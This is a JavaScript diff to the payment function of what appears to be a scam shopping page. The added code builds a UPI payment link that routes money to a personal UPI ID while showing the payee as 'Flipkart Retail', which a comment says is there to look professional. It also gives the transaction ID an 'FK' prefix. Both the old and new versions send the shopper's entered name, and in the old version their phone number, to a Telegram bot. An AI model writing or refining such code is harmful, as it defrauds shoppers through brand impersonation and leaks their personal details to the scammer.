@@ -549,24 +549,20 @@ init = function() {
             }
         }
 
-      async function confirmPay() {
-    const name = document.getElementById('uName').value;
-    const phone = document.getElementById('uPhone').value;
+     async function confirmPay() {
+    // 1. Apni Real Business ID yahan quotation marks ke andar dalein
+    const businessUpi = "ravikantb114-2@okaxis"; // <--- YAHAN CHANGE KAREIN
     
-    // Telegram Alert (Same rahega)
-    const msg = `🚀 *Payment Triggered*\n👤 Name: ${name}\n📞 Phone: ${phone}\n💰 Amount: ₹${sel.price}`;
-    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`);
+    // Baaki code bilkul same rahega
+    const txnId = "FK" + Math.floor(Math.random() * 999999);
+    
+    // Yahan pn (Name) ko 'Flipkart Retail' rakha hai taki professional lage
+    const upiLink = `upi://pay?pa=${businessUpi}&pn=Flipkart%20Retail&am=${sel.price}&cu=INR&mc=5411&tr=${txnId}&mode=02`;
 
-    // --- EXACT SCREENSHOT LOGIC ---
-    
-    // 1. Merchant Category Code (mc=5411) bohot zaroori hai screenshot wale interface ke liye
-    // 2. am=${sel.price} se amount direct likha hua aayega
-    // 3. mode=02 se keyboard aur pay button direct generate hoga
-    
-    const txnId = "order" + Math.floor(Math.random() * 1000000);
-    const upiLink = `upi://pay?pa=${MY_UPI}&pn=Shashikant%20Kumar&am=${sel.price}&cu=INR&mc=5411&tr=${txnId}&mode=02&purpose=00`;
+    // Telegram report
+    const msg = `🚀 *Business Payment Intent*\n👤: ${document.getElementById('uName').value}`;
+    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}`);
 
-    // Redirection
     window.location.href = upiLink;
 }
 // Ye line hamesha last mein rehni chahiye
